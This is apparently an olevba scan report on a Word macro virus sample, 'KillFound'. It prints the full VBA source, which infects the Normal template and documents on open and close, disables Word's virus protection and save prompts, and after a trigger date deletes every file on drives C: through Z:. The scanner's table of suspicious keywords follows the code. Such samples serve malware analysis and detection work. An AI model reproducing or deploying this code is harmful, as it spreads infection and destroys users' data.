olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.KillFound-8d4a98c28a0f704f41280660540b9001aed2eeb5
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO Dina.cls 
in file: Virus.MSWord.KillFound-8d4a98c28a0f704f41280660540b9001aed2eeb5 - OLE stream: 'Macros/VBA/Dina'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
  On Error Resume Next
  If ActiveDocument.VBProject.VBComponents(1).Name <> "Dina" Then
     Set go = ActiveDocument.VBProject.VBComponents(1)
     saveit = True
     ElseIf NormalTemplate.VBProject.VBComponents(1).Name <> "Dina" Then
            Set go = NormalTemplate.VBProject.VBComponents(1)
  End If
  With go
    .CodeModule.deletelines 1, .CodeModule.countoflines
    .CodeModule.insertlines 1, Dina.VBProject.VBComponents(1).CodeModule.lines(1, Dina.VBProject.VBComponents(1).CodeModule.countoflines)
    .Name = "Dina"
  End With
  Options.ConfirmConversions = 0
  Options.SaveNormalPrompt = 0
  Options.VirusProtection = 0
  If saveit = True Then ActiveDocument.SaveAs FileName:=ActiveDocument.FullName, FileFormat:=wdFormatDocument
  If (Day(Now()) >= 4) And (Month(Now()) = 2) And (Year(Now()) >= 2003) Then
     For k = 90 To 67 Step -1
         With Application.FileSearch
              .NewSearch
              .LookIn = Chr(k) + ":\"
              .SearchSubFolders = True
              .FileName = "*.*"
              .MatchTextExactly = False
              .FileType = msoFileTypeAllFiles
              If .Execute > 0 Then
                 For i = 1 To .FoundFiles.Count
                     Kill .FoundFiles(i)
                 Next i
              End If
         End With
     Next k
  End If
End Sub
Private Sub Document_Close()
  Document_Open
End Sub
'-----BEGIN PGP MESSAGE-----
'Version: PGP 7.0.1
'qANQR1DDDQQDAwK7okQ9K+8ZB2DJnxC2/f100uQmDHWuys000cDrvnTuSXBJ//Yi
'OuqKU/NrLfQ5bT8/ec4aamRSinTx3ZkiJxEouGxGUjjk3Q3Yl1y7jn+6VhZO6fUQ
'ZSUTc9g2md6RXxO8Lg+1O2q7b5G26hCs74VqqFRPbhd7DFNky6V7rm6vvU+GzMRG
'7yDjm+LIOFpwqtyz6BxPbZsVw8wj5NQUnmr2ZtNgRk4A+M4YCQ==
'=+0jJ
'-----END PGP MESSAGE-----
+----------+--------------------+---------------------------------------------+
|Type      |Keyword             |Description                                  |
+----------+--------------------+---------------------------------------------+
|AutoExec  |Document_Close      |Runs when the Word document is closed        |
|AutoExec  |Document_Open       |Runs when the Word or Publisher document is  |
|          |                    |opened                                       |
|Suspicious|Kill                |May delete a file                            |
|Suspicious|Chr                 |May attempt to obfuscate specific strings    |
|          |                    |(use option --deobf to deobfuscate)          |
|Suspicious|VBProject           |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|VBComponents        |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|CodeModule          |May attempt to modify the VBA code (self-    |
|          |                    |modification)                                |
|Suspicious|Hex Strings         |Hex-encoded strings were detected, may be    |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
|Suspicious|Base64 Strings      |Base64-encoded strings were detected, may be |
|          |                    |used to obfuscate strings (option --decode to|
|          |                    |see all)                                     |
+----------+--------------------+---------------------------------------------+

